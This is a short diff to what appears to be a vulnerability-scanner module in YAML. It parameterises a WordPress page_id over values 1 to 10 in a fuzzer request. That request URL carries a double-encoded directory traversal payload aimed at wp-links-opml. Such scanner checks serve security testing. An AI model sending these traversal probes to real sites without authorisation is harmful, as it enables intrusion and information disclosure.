@@ -34,11 +34,22 @@ payloads:
         ssl: false
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}?page_id=2&pagename={{dir_suffix}}%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fwp-links-opml"
+            input_format: "{{schema}}://{target}:{{ports}}?page_id={{page_id}}&pagename={{dir_suffix}}%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fwp-links-opml"
             prefix: ""
             suffix: ""
             interceptors: ""
             data:
+              page_id: 
+                - 1
+                - 2
+                - 3
+                - 4
+                - 5
+                - 6
+                - 7
+                - 8
+                - 9
+                - 10
               schema:
                 - "http"
                 - "https"
